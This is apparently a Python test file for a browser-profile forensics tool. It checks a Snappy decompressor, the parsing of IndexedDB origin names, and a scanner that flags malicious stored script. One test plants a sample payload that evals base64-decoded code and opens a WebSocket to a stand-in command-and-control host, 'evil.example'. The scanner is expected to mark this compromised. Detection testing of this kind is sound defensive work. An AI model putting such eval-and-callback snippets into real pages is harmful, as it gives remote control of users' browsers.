"""Tests for the Snappy decompressor and IndexedDB sibling-channel scanning."""
import sys, pathlib, os, tempfile, struct
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "src"))

from flotsam.snappy import decompress
from flotsam.indexeddb import extract_values, _origin_from_dirname
from flotsam.extract import deep_extract
from flotsam.hunt import hunt
from flotsam.models import Verdict


def _varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F; n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def test_snappy_literal():
    blob = _varint(5) + bytes([(5 - 1) << 2]) + b"hello"
    assert decompress(blob) == b"hello"


def test_snappy_copy():
    # "abcdabcd" = literal "abcd" then copy len4 offset4 (2-byte-offset form)
    blob = _varint(8) + bytes([(4 - 1) << 2]) + b"abcd"
    blob += bytes([((4 - 1) << 2) | 2]) + struct.pack("<H", 4)
    assert decompress(blob) == b"abcdabcd"


def test_idb_origin_from_dirname():
    assert _origin_from_dirname("https_bank.example_443.indexeddb.leveldb") == "https://bank.example"
    assert _origin_from_dirname("http_localhost_8000.indexeddb.leveldb") == "http://localhost:8000"


def _log_record(seq, key, val):
    batch = struct.pack("<QI", seq, 1) + b"\x01" + _varint(len(key)) + key + _varint(len(val)) + val
    return b"\x00\x00\x00\x00" + struct.pack("<H", len(batch)) + b"\x01" + batch


def test_indexeddb_payload_flagged():
    with tempfile.TemporaryDirectory() as prof:
        d = os.path.join(prof, "IndexedDB", "https_evil.example_443.indexeddb.leveldb")
        os.makedirs(d)
        payload = b"var p=atob('eA==');eval(p);new WebSocket('wss://evil.example/c2');"
        open(os.path.join(d, "000003.log"), "wb").write(_log_record(1, b"os\x001", payload))
        vals = extract_values(prof)
        assert any("evil.example" in o and "eval" in t for o, t in vals), vals
        inv = deep_extract(prof)
        res = hunt(inv)
        rules = {f.rule for f in res.findings}
        assert any(r.startswith("idb:") for r in rules), rules
        assert res.verdict is Verdict.COMPROMISED, res.stats


if __name__ == "__main__":
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn(); print(f"ok  {name}")
    print("all hardening tests passed")
